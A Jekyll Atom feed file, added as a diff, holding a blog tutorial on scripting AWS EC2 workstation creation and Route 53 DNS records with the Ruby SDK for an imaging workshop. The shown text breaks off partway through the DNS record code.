@@ -1,0 +1,521 @@
+<?xml version="1.0" encoding="utf-8"?><?xml-stylesheet type="text/xml" href="http://localhost:4000/feed.xslt.xml"?><feed xmlns="http://www.w3.org/2005/Atom"><generator uri="http://jekyllrb.com" version="3.4.0">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2017-06-16T18:25:09-04:00</updated><id>http://localhost:4000//</id><title type="html">The I Do Imaging Blog</title><subtitle>The blog of I Do Imaging
+</subtitle><entry><title type="html">Creating AWS instances and DNS records using the Ruby SDK</title><link href="http://localhost:4000/2017/06/08/creating-aws-instances-and-dns-records-using-the-ruby-sdk.html" rel="alternate" type="text/html" title="Creating AWS instances and DNS records using the Ruby SDK" /><published>2017-06-08T00:00:00-04:00</published><updated>2017-06-08T00:00:00-04:00</updated><id>http://localhost:4000/2017/06/08/creating-aws-instances-and-dns-records-using-the-ruby-sdk</id><content type="html" xml:base="http://localhost:4000/2017/06/08/creating-aws-instances-and-dns-records-using-the-ruby-sdk.html">&lt;p&gt;Using the Ruby SDK for Amazon Web Services to create any number of EC2 instances and configure their DNS&lt;/p&gt;
+
+&lt;h1 id=&quot;amazon-web-services-and-the-ruby-sdk&quot;&gt;Amazon Web Services and the Ruby SDK&lt;/h1&gt;
+
+&lt;p&gt;For the recent &lt;a href=&quot;/2017/06/07/teaching-imaging-with-remote-workstations.html&quot;&gt;medical imaging workshop&lt;/a&gt;, I needed to provide each participant with a remote workstation: an &lt;a href=&quot;https://aws.amazon.com/ec2/&quot;&gt;AWS EC2&lt;/a&gt; (remote server) Windows instance to which they would connect.  The logistics of setting up these instances as remote workstations presented some interesting challenges.  I wanted to be able to create, start, and stop up to 20 identical workstations, and have them accessible by DNS address rather than IP number.  As these are on-demand EC2 images, billed by the hour, I did not want them to be running for too long, so I needed to be able to create, destroy, start and stop the instances using a script.  In addition, I wanted each workstation to have a static IP for DICOM communication purposes, but on-demand EC2 instances are allocated a public IP number each time they are started up.&lt;/p&gt;
+
+&lt;picture&gt;
+    &lt;source srcset=&quot;http://localhost:4000/generated/20170605_aws_design-473by338-441d11.png&quot; media=&quot;(min-width: 40em) and (-webkit-min-device-pixel-ratio: 1.5), (min-width: 40em) and (min-resolution: 144dpi)&quot; /&gt;
+    &lt;source srcset=&quot;http://localhost:4000/generated/20170605_aws_design-473by338-441d11.png&quot; media=&quot;(min-width: 40em)&quot; /&gt;
+    &lt;source srcset=&quot;http://localhost:4000/generated/20170605_aws_design-473by338-441d11.png&quot; media=&quot;(min-width: 30em) and (-webkit-min-device-pixel-ratio: 1.5), (min-width: 30em) and (min-resolution: 144dpi)&quot; /&gt;
+    &lt;source srcset=&quot;http://localhost:4000/generated/20170605_aws_design-450by322-441d11.png&quot; media=&quot;(min-width: 30em)&quot; /&gt;
+    &lt;source srcset=&quot;http://localhost:4000/generated/20170605_aws_design-473by270-441d11.png&quot; media=&quot;(-webkit-min-device-pixel-ratio: 1.5), (min-resolution: 144dpi)&quot; /&gt;
+    &lt;source srcset=&quot;http://localhost:4000/generated/20170605_aws_design-350by200-441d11.png&quot; /&gt;
+    &lt;img src=&quot;http://localhost:4000/generated/20170605_aws_design-350by200-441d11.png&quot; class=&quot;blog-full&quot; itemprop=&quot;image&quot; width=&quot;400&quot; /&gt;
+  &lt;/picture&gt;
+
+&lt;p&gt;The design called for each instance to have two network interfaces: one with a configureable static IP number on a private subnet, and one with a dynamic public IP address that could be resolved by a systematic DNS address.  The AWS API made satisfying these requirements quite easy.  I use the SDK for Ruby, though it’s also available in Python, Java, .Net, Node, Go, PHP and other languages.&lt;/p&gt;
+
+&lt;h2 id=&quot;using-the-sdk&quot;&gt;Using the SDK&lt;/h2&gt;
+
+&lt;p&gt;The first step is to log in.  Credentials are stored in a configuration file &lt;code class=&quot;highlighter-rouge&quot;&gt;~/.aws/credentials&lt;/code&gt; in the form of a key and ID.  Multiple named profiles are permitted; as the course was held in Europe and the instances hosted in the &lt;code class=&quot;highlighter-rouge&quot;&gt;eu-central-1&lt;/code&gt; region, I created a profile named &lt;code class=&quot;highlighter-rouge&quot;&gt;europe&lt;/code&gt;.&lt;/p&gt;
+
+&lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# .aws/credentials&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;europe]
+aws_access_key_id &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; AKIAI3F00F00F00F00
+aws_secret_access_key &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; hiKopd9h8iKERBAABAABAABAA
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;Then you log in with these credentials and create a client (with methods corresponding to the API) or a resource, for an object-oriented interface (nice explanation &lt;a href=&quot;https://goo.gl/3agnxh&quot;&gt;here&lt;/a&gt;.  I created both.&lt;/p&gt;
+
+&lt;div class=&quot;language-ruby highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;no&quot;&gt;Aws&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;config&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;update&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
+  &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;ss&quot;&gt;region:      &lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'eu-central-1'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+    &lt;span class=&quot;ss&quot;&gt;credentials: &lt;/span&gt;&lt;span class=&quot;no&quot;&gt;Aws&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;SharedCredentials&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;new&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;ss&quot;&gt;:profile_name&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'europe'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;vi&quot;&gt;@rsrc&lt;/span&gt;   &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;Aws&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;EC2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;Resource&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;new&lt;/span&gt;
+&lt;span class=&quot;vi&quot;&gt;@client&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;Aws&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;EC2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;Client&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;new&lt;/span&gt;
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;h2 id=&quot;creating-ec2-instances&quot;&gt;Creating EC2 Instances&lt;/h2&gt;
+
+&lt;p&gt;Now we can do stuff.  EC2 instances are created with the resource method &lt;code class=&quot;highlighter-rouge&quot;&gt;create_instances&lt;/code&gt; which I put in a method, called with the index of the workstation to create.  The image ID is the AMI I created by saving the pre-configured master workstation.  EC2 provides a free-form tagging system, so to be able to locate the workstations by name, I create a tag ‘Name’ with value ‘workstation01’ for ordinal 1, IP address 1, and so on.  The adddition of the domain name (&lt;code class=&quot;highlighter-rouge&quot;&gt;idoimaging.com&lt;/code&gt;) in &lt;code class=&quot;highlighter-rouge&quot;&gt;name_for&lt;/code&gt; is to accommodate DNS records later.&lt;/p&gt;
+
+&lt;p&gt;The private IP address is set to the base of the private subnet (which depends on the implementation, I’ve used 10.0.0.0 here for illustration), ending with the ordinal, or index, of the instance.  Calling &lt;code class=&quot;highlighter-rouge&quot;&gt;create_instance_resource(1)&lt;/code&gt; results in an instance being created with IP &lt;code class=&quot;highlighter-rouge&quot;&gt;10.0.0.1&lt;/code&gt; and a &lt;code class=&quot;highlighter-rouge&quot;&gt;Name&lt;/code&gt; tag of &lt;code class=&quot;highlighter-rouge&quot;&gt;workshop01.idoimaging.com&lt;/code&gt;.&lt;/p&gt;
+
+&lt;div class=&quot;language-ruby highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;name_for&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ordinal&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;full&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;kp&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+  &lt;span class=&quot;nb&quot;&gt;sprintf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'workshop%02d'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ordinal&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;full&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;?&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;.idoimaging.com&quot;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;create_instance_resource&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ordinal&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+  &lt;span class=&quot;n&quot;&gt;params&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;ss&quot;&gt;image_id: &lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'ami-f00f000'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+    &lt;span class=&quot;ss&quot;&gt;min_count: &lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+    &lt;span class=&quot;ss&quot;&gt;max_count: &lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+    &lt;span class=&quot;ss&quot;&gt;instance_type: &lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'t2.small'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+    &lt;span class=&quot;ss&quot;&gt;placement: &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;availability_zone: &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;eu-central-1b&quot;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;},&lt;/span&gt;
+    &lt;span class=&quot;ss&quot;&gt;key_name: &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;my_key&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+    &lt;span class=&quot;ss&quot;&gt;security_groups: &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;my_group&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt;
+    &lt;span class=&quot;ss&quot;&gt;private_ip_address: &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;10.0.0.&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;#{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ordinal&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+    &lt;span class=&quot;ss&quot;&gt;tag_specifications: &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;
+      &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+        &lt;span class=&quot;ss&quot;&gt;resource_type: &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;instance&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+        &lt;span class=&quot;ss&quot;&gt;tags: &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;
+          &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+            &lt;span class=&quot;ss&quot;&gt;key:   &lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'Name'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+            &lt;span class=&quot;ss&quot;&gt;value: &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;name_for&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ordinal&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+          &lt;span class=&quot;p&quot;&gt;},&lt;/span&gt;
+        &lt;span class=&quot;p&quot;&gt;],&lt;/span&gt;
+      &lt;span class=&quot;p&quot;&gt;},&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
+  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+  &lt;span class=&quot;vi&quot;&gt;@rsrc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;create_instances&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;params&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;h2 id=&quot;dns-records&quot;&gt;DNS Records&lt;/h2&gt;
+
+&lt;p&gt;Now we have an instance with a defined private IP, which is necessary for the PACS communications for the workshop.  In order to connect with the instance using Remote Desktop, we need to either use the public IP of the instance, which is randomly assigned by AWS, or we need to assign a DNS record for this address.  I chose the DNS approach, and created DNS records with names like &lt;code class=&quot;highlighter-rouge&quot;&gt;workshop01.idoimaging.com&lt;/code&gt; to map to the public IP addresses.  To create the DNS records, instances are located by the Name tag (based on the ordinal index of the workstation) and queried for their public IP in the method &lt;code class=&quot;highlighter-rouge&quot;&gt;public_ip_of_instance()&lt;/code&gt;:&lt;/p&gt;
+
+&lt;div class=&quot;language-ruby highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;name_filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ordinal&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+  &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;ss&quot;&gt;name:   &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;tag:Name&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+    &lt;span class=&quot;ss&quot;&gt;values: &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;name_for&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ordinal&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)],&lt;/span&gt;
+  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;instance&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ordinal&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+  &lt;span class=&quot;n&quot;&gt;filter&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;ss&quot;&gt;filters: &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;name_filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ordinal&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)]&lt;/span&gt;
+  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+  &lt;span class=&quot;n&quot;&gt;instances&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;vi&quot;&gt;@rsrc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;instances&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+  &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;instances&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;count&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;eql?&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;?&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;instances&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;first&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;kp&quot;&gt;nil&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;public_ip_of_instance&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ordinal&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+  &lt;span class=&quot;n&quot;&gt;inst&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;instance&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ordinal&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+  &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;inst&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;?&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;inst&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;public_ip_address&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;kp&quot;&gt;nil&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;Now we have the public IP number for the instance of a given ordinal, we can create a DNS record for it.  This uses the AWS Route 53 service, so we need a Route 53 client.  This code block has had all the error checking removed, along with the code that checks for existing DNS records, and just handles DNS record creation in the method &lt;code class=&quot;highlighter-rouge&quot;&gt;create_dns_for()&lt;/code&gt;, which takes the ordinal of the workstation as a parameter.  This method gets the public IP of the instance by calling &lt;code class=&quot;highlighter-rouge&quot;&gt;public_ip_of_instance()&lt;/code&gt;, and passes this IP number to &lt;code class=&quot;highlighter-rouge&quot;&gt;make_record_set(ordinal, ip)&lt;/code&gt;.  This method creates a hash of values (&lt;code class=&quot;highlighter-rouge&quot;&gt;resource_record_set&lt;/code&gt;) with the fully qualified DNS name of the workstation in &lt;code class=&quot;highlighter-rouge&quot;&gt;name&lt;/code&gt;, the type of DNS record (&lt;code class=&quot;highlighter-rouge&quot;&gt;A&lt;/code&gt;) in &lt;code class=&quot;highlighter-rouge&quot;&gt;type&lt;/code&gt;,  and the public IP number in the &lt;code class=&quot;highlighter-rouge&quot;&gt;value&lt;/code&gt; key of &lt;code class=&quot;highlighter-rouge&quot;&gt;resource_records&lt;/code&gt;.  This hash is in turn wrapped in a hash with &lt;code class=&quot;highlighter-rouge&quot;&gt;action&lt;/code&gt; of &lt;code class=&quot;highlighter-rouge&quot;&gt;UPSERT&lt;/code&gt; (update or insert), and returned from the method.&lt;/p&gt;
+
+&lt;p&gt;Finally, the hash is passed to the &lt;code class=&quot;highlighter-rouge&quot;&gt;change_resource_record_sets&lt;/code&gt; method of the Route 53 object, and the A record mapping the DNS name to the public IP of the instance is created.&lt;/p&gt;
+
+&lt;div class=&quot;language-ruby highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;setup_route53&lt;/span&gt;
+  &lt;span class=&quot;vi&quot;&gt;@route53&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;Aws&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;Route53&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;Client&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;new&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;ss&quot;&gt;region: &lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'eu-central-1'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;get_record_sets&lt;/span&gt;
+  &lt;span class=&quot;n&quot;&gt;filter&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;hosted_zone_id: &lt;/span&gt;&lt;span class=&quot;no&quot;&gt;HOSTED_ZONE_ID&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+  &lt;span class=&quot;n&quot;&gt;record_sets_list&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;vi&quot;&gt;@route53&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;list_resource_record_sets&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+  &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;record_sets_list&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;resource_record_sets&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;
+
+&lt;span class=&quot;c1&quot;&gt;# Return record set with name containing given ordinal&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;get_record_set&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ordinal&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+  &lt;span class=&quot;n&quot;&gt;record_sets&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;get_record_sets&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;select&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;record_set&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;record_set&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;eql?&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;#{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;name_for&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ordinal&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kp&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;.&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+  &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;record_sets&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;count&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;eql?&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;?&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;record_sets&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;first&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;kp&quot;&gt;nil&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;
+
+&lt;span class=&quot;c1&quot;&gt;# Update/insert record to have given name and IP number&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;make_record_set&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ordinal&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ip&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+  &lt;span class=&quot;n&quot;&gt;changes&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
